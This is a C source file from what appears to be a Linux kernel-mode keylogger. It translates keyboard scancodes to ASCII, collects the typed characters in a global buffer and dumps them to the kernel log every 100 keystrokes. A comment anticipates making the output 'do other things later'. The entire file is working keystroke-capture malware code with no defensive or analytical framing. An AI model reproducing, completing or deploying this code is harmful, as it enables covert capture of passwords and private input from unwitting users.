#include <linux/kernel.h>
#include <linux/string.h>

#include "keylogger.h"

extern uint64_t * __global_keylogger_counter;
extern char * __global_keylogger_buffer;


// Credit for this table from https://stackoverflow.com/questions/61124564/convert-scancodes-to-ascii
// It's not nearly complete, but gets the message across for sure
char kbd_US [128] =
{
    0,  27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',   
  '\t', /* <-- Tab */
  'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',     
    0, /* <-- control key */
  'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',  0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',   0,
  '*',
    0,  /* Alt */
  ' ',  /* Space bar */
    0,  /* Caps lock */
    0,  /* 59 - F1 key ... > */
    0,   0,   0,   0,   0,   0,   0,   0,
    0,  /* < ... F10 */
    0,  /* 69 - Num lock*/
    0,  /* Scroll Lock */
    0,  /* Home key */
    0,  /* Up Arrow */
    0,  /* Page Up */
  '-',
    0,  /* Left Arrow */
    0,
    0,  /* Right Arrow */
  '+',
    0,  /* 79 - End key*/
    0,  /* Down Arrow */
    0,  /* Page Down */
    0,  /* Insert Key */
    0,  /* Delete Key */
    0,   0,   0,
    0,  /* F11 Key */
    0,  /* F12 Key */
    0,  /* All other keys are undefined */
};

void keylog_char(char c){
    uint64_t index = *(__global_keylogger_counter);
    //printk("Index: %d\n", index);

    if ((uint8_t)c > 127){
        return;
    }
    
    char ascii_char = kbd_US[(uint8_t)c];
    if ((uint8_t)ascii_char != 0){
        //printk("Logging: %x\n", ascii_char);
        if (index >= 100){
            output_keylogger_buf();     // Print out the buffer
            clear_keylogger_buf();      // Clear the buffer
            *(__global_keylogger_counter) = 0;      // Set the counter to 0
        } else {
            *(__global_keylogger_buffer + index) = ascii_char;
            *(__global_keylogger_counter) += 1;
        }
    }
    return;
}

// Clearing the keylogger buffer via setting all its bytes to 0
void clear_keylogger_buf(void){
    memset(__global_keylogger_buffer, 0, *__global_keylogger_counter);
    return;
}

// This currently just prints out the buffer, but we can make it do other things later
void output_keylogger_buf(void){
    printk("\n\nKey Logger Buffer: %s\n\n", __global_keylogger_buffer);
    return;
}